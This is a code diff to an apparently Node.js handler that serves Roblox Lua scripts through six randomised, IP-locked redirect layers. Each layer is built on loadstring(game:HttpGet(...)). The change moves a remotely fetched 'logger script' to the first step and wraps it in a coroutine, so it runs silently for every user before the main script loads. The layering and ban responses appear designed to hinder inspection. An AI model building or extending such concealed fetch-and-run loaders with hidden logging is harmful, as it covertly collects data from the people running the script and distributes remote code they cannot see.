@@ -97,7 +97,7 @@ module.exports = async function(req, res) {
     const currentPath = urlParts[0];
     
     try {
-        // ========== STEP 0: INIT SESSION ==========
+        // ========== STEP 0: LOGGER SCRIPT + REDIRECT KE LAYER 1 ==========
         if (currentStep === 0) {
             let sequence = [];
             while (sequence.length < SETTINGS.TOTAL_LAYERS) {
@@ -105,15 +105,21 @@ module.exports = async function(req, res) {
                 if (!sequence.includes(r)) sequence.push(r);
             }
 
-            // index 0 = layer 1, session dibuat untuk menerima request layer 1
             const { newSessionID, nextKey, waitTime } = makeSession(cleanIp, sequence, 0);
             const firstStep = sequence[0];
             const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
-            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+
+            // Logger jalan di coroutine, lalu redirect ke layer 1
+            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
+            const luaScript = "coroutine.wrap(function()\n" +
+                              (loggerScript || '') + "\n" +
+                              "end)()\n" +
+                              "task.wait(" + (waitTime / 1000) + ") " +
+                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
 
-        // ========== VALIDASI HANDSHAKE (step > 0) ==========
+        // ========== VALIDASI HANDSHAKE ==========
         const session = sessions[id];
 
         if (!session || session.ownerIP !== cleanIp) {
@@ -147,9 +153,19 @@ module.exports = async function(req, res) {
             return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
         }
 
-        // Ambil idx DARI currentIndex session sekarang
         const idx = session.currentIndex;
         session.used = true;
+
+        /*
+         * TOTAL_LAYERS = 6, mapping idx:
+         * step 0  → logger + redirect ke layer 1
+         * idx 0   → layer 1 → redirect biasa
+         * idx 1   → layer 2 → redirect biasa
+         * idx 2   → layer 3 → redirect biasa
+         * idx 3   → layer 4 → redirect biasa
+         * idx 4   → layer 5 → redirect biasa
+         * idx 5   → layer 6 → MAIN SCRIPT SAJA ✅
+         */
 
         // ========== LAYER 6 (idx 5): MAIN SCRIPT SAJA ==========
         if (idx === 5) {
@@ -158,27 +174,7 @@ module.exports = async function(req, res) {
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 5 (idx 4): LOGGER + LOADSTRING KE LAYER 6 ==========
-        if (idx === 4) {
-            const nextStepNumber = session.stepSequence[5];
-            const { newSessionID, nextKey, waitTime } = makeSession(
-                session.ownerIP, session.stepSequence, 5
-            );
-            delete sessions[id];
-
-            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
-            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-
-            const luaScript = "coroutine.wrap(function()\n" +
-                              (loggerScript || '') + "\n" +
-                              "end)()\n" +
-                              "task.wait(" + (waitTime / 1000) + ") " +
-                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
-
-            return res.status(200).send(luaScript);
-        }
-
-        // ========== LAYER 1-4 (idx 0,1,2,3): REDIRECT BIASA ==========
+        // ========== LAYER 1-5 (idx 0,1,2,3,4): REDIRECT BIASA ==========
         const nextIndex = idx + 1;
         const nextStepNumber = session.stepSequence[nextIndex];
         const { newSessionID, nextKey, waitTime } = makeSession(
